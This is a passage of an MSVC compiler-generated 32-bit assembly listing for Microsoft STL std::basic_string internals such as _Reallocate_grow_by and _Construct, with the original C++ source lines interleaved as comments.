; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 07	 cmp	 DWORD PTR __Old_capacity$[ebp], 7
  00099	76 4c		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	0f b7 4d 14	 movzx	 ecx, WORD PTR _<_Args_1>$[ebp]
  000a7	51		 push	 ecx
  000a8	8b 55 10	 mov	 edx, DWORD PTR _<_Args_0>$[ebp]
  000ab	52		 push	 edx
  000ac	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  000af	50		 push	 eax
  000b0	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000b3	51		 push	 ecx
  000b4	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  000b9	83 c4 04	 add	 esp, 4
  000bc	50		 push	 eax
  000bd	8b 55 d8	 mov	 edx, DWORD PTR __Raw_new$[ebp]
  000c0	52		 push	 edx
  000c1	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c4	e8 00 00 00 00	 call	 ??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z ; <lambda_c3135ae829aeedc0a8af1bd1e887c66a>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c9	8b 45 e4	 mov	 eax, DWORD PTR __Old_capacity$[ebp]
  000cc	50		 push	 eax
  000cd	8b 4d e0	 mov	 ecx, DWORD PTR __Old_ptr$1[ebp]
  000d0	51		 push	 ecx
  000d1	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  000d4	52		 push	 edx
  000d5	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
  000da	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000dd	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000e0	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000e3	89 08		 mov	 DWORD PTR [eax], ecx

; 4832 :         } else {

  000e5	eb 2d		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e7	0f b7 55 14	 movzx	 edx, WORD PTR _<_Args_1>$[ebp]
  000eb	52		 push	 edx
  000ec	8b 45 10	 mov	 eax, DWORD PTR _<_Args_0>$[ebp]
  000ef	50		 push	 eax
  000f0	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  000f3	51		 push	 ecx
  000f4	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000f7	52		 push	 edx
  000f8	8b 45 d8	 mov	 eax, DWORD PTR __Raw_new$[ebp]
  000fb	50		 push	 eax
  000fc	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000ff	e8 00 00 00 00	 call	 ??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z ; <lambda_c3135ae829aeedc0a8af1bd1e887c66a>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00104	8d 4d f0	 lea	 ecx, DWORD PTR __New_ptr$[ebp]
  00107	51		 push	 ecx
  00108	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0010b	52		 push	 edx
  0010c	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  00111	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00114	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  00117	8b e5		 mov	 esp, ebp
  00119	5d		 pop	 ebp
  0011a	c2 10 00	 ret	 16			; 00000010H
??$_Reallocate_grow_by@V<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@I_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_c3135ae829aeedc0a8af1bd1e887c66a>,unsigned int,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -2						; size = 2
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Count$ = 20						; size = 4
__Ch$ = 24						; size = 2
??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z PROC ; <lambda_c3135ae829aeedc0a8af1bd1e887c66a>::operator(), COMDAT
; _this$ = ecx

; 3350 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 3347 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3348 :                 _Traits::assign(_New_ptr + _Old_size, _Count, _Ch);

  0001d	0f b7 45 18	 movzx	 eax, WORD PTR __Ch$[ebp]
  00021	50		 push	 eax
  00022	8b 4d 14	 mov	 ecx, DWORD PTR __Count$[ebp]
  00025	51		 push	 ecx
  00026	8b 55 10	 mov	 edx, DWORD PTR __Old_size$[ebp]
  00029	8b 45 08	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  0002c	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  0002f	51		 push	 ecx
  00030	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAPA_WQA_WI_W@Z ; std::_WChar_traits<wchar_t>::assign
  00035	83 c4 0c	 add	 esp, 12			; 0000000cH

; 3349 :                 _Traits::assign(_New_ptr[_Old_size + _Count], _Elem());

  00038	33 d2		 xor	 edx, edx
  0003a	66 89 55 fe	 mov	 WORD PTR $T1[ebp], dx
  0003e	8d 45 fe	 lea	 eax, DWORD PTR $T1[ebp]
  00041	50		 push	 eax
  00042	8b 4d 10	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00045	03 4d 14	 add	 ecx, DWORD PTR __Count$[ebp]
  00048	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  0004b	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  0004e	50		 push	 eax
  0004f	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00054	83 c4 08	 add	 esp, 8

; 3350 :             },

  00057	8b e5		 mov	 esp, ebp
  00059	5d		 pop	 ebp
  0005a	c2 14 00	 ret	 20			; 00000014H
??R<lambda_c3135ae829aeedc0a8af1bd1e887c66a>@@QBE@QA_WQB_WII_W@Z ENDP ; <lambda_c3135ae829aeedc0a8af1bd1e887c66a>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPA_WPA_W@Z
_TEXT	SEGMENT
__Ptr$ = 8						; size = 4
??$_Unfancy@_W@std@@YAPA_WPA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 36   :     return _Ptr;

  00003	8b 45 08	 mov	 eax, DWORD PTR __Ptr$[ebp]

; 37   : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$_Unfancy@_W@std@@YAPA_WPA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z
_TEXT	SEGMENT
__Al$ = -28						; size = 4
__Alproxy$ = -24					; size = 4
__New_ptr$ = -20					; size = 4
__New_capacity$ = -16					; size = 4
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
__Proxy$ = -1						; size = 1
__Arg$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Construct@$01PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>, COMDAT
; _this$ = ecx

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000f	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00017	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001a	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  0001c	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00021	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00029	89 45 e4	 mov	 DWORD PTR __Al$[ebp], eax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  0002c	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __Alproxy$[ebp], OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00033	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00036	51		 push	 ecx
  00037	8b 55 e8	 mov	 edx, DWORD PTR __Alproxy$[ebp]
  0003a	52		 push	 edx
  0003b	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0003e	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00043	83 7d 0c 0f	 cmp	 DWORD PTR __Count$[ebp], 15 ; 0000000fH
  00047	77 2f		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  00049	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  0004c	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0004f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00052	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00055	c7 42 14 0f 00
	00 00		 mov	 DWORD PTR [edx+20], 15	; 0000000fH

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

  0005c	6a 10		 push	 16			; 00000010H
  0005e	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  00061	50		 push	 eax
  00062	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00065	51		 push	 ecx
  00066	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0006b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  0006e	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  00071	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  00076	eb 77		 jmp	 SHORT $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00078	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  0007b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00080	50		 push	 eax
  00081	6a 0f		 push	 15			; 0000000fH
  00083	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  00086	52		 push	 edx
  00087	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0008c	83 c4 0c	 add	 esp, 12			; 0000000cH
  0008f	89 45 f0	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00092	8d 45 f0	 lea	 eax, DWORD PTR __New_capacity$[ebp]
  00095	50		 push	 eax
  00096	8b 4d e4	 mov	 ecx, DWORD PTR __Al$[ebp]
  00099	51		 push	 ecx
  0009a	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  0009f	83 c4 08	 add	 esp, 8
  000a2	89 45 ec	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000a5	8d 55 ec	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000a8	52		 push	 edx
  000a9	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000ac	50		 push	 eax
  000ad	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  000b2	83 c4 08	 add	 esp, 8

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  000b5	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000b8	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000bb	89 51 10	 mov	 DWORD PTR [ecx+16], edx

; 2704 :         _My_data._Myres  = _New_capacity;

  000be	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000c1	8b 4d f0	 mov	 ecx, DWORD PTR __New_capacity$[ebp]
  000c4	89 48 14	 mov	 DWORD PTR [eax+20], ecx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

  000c7	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000ca	83 c2 01	 add	 edx, 1
  000cd	52		 push	 edx
  000ce	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  000d1	50		 push	 eax
  000d2	8b 4d ec	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000d5	51		 push	 ecx
  000d6	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000db	83 c4 04	 add	 esp, 4
  000de	50		 push	 eax
  000df	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  000e4	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  000e7	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  000ea	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:

; 2717 :     }

  000ef	8b e5		 mov	 esp, ebp
  000f1	5d		 pop	 ebp
  000f2	c2 08 00	 ret	 8
??$_Construct@$01PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z
_TEXT	SEGMENT
__Al$ = -28						; size = 4
__Alproxy$ = -24					; size = 4
__New_capacity$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
$T1 = -3						; size = 1
$T2 = -2						; size = 1
__Proxy$ = -1						; size = 1
__Arg$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>, COMDAT
; _this$ = ecx

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000f	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00017	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001a	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  0001c	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00021	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00029	89 45 e4	 mov	 DWORD PTR __Al$[ebp], eax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  0002c	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __Alproxy$[ebp], OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00033	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00036	51		 push	 ecx
  00037	8b 55 e8	 mov	 edx, DWORD PTR __Alproxy$[ebp]
  0003a	52		 push	 edx
  0003b	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0003e	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00043	83 7d 0c 0f	 cmp	 DWORD PTR __Count$[ebp], 15 ; 0000000fH
  00047	77 4b		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  00049	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  0004c	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0004f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00052	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00055	c7 42 14 0f 00
	00 00		 mov	 DWORD PTR [edx+20], 15	; 0000000fH

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);

  0005c	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0005f	50		 push	 eax
  00060	8b 4d 08	 mov	 ecx, DWORD PTR __Arg$[ebp]
  00063	51		 push	 ecx
  00064	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00067	52		 push	 edx
  00068	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0006d	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  00070	c6 45 fe 00	 mov	 BYTE PTR $T2[ebp], 0
  00074	8d 45 fe	 lea	 eax, DWORD PTR $T2[ebp]
  00077	50		 push	 eax
  00078	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0007b	03 4d 0c	 add	 ecx, DWORD PTR __Count$[ebp]
  0007e	51		 push	 ecx
  0007f	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  00084	83 c4 08	 add	 esp, 8

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
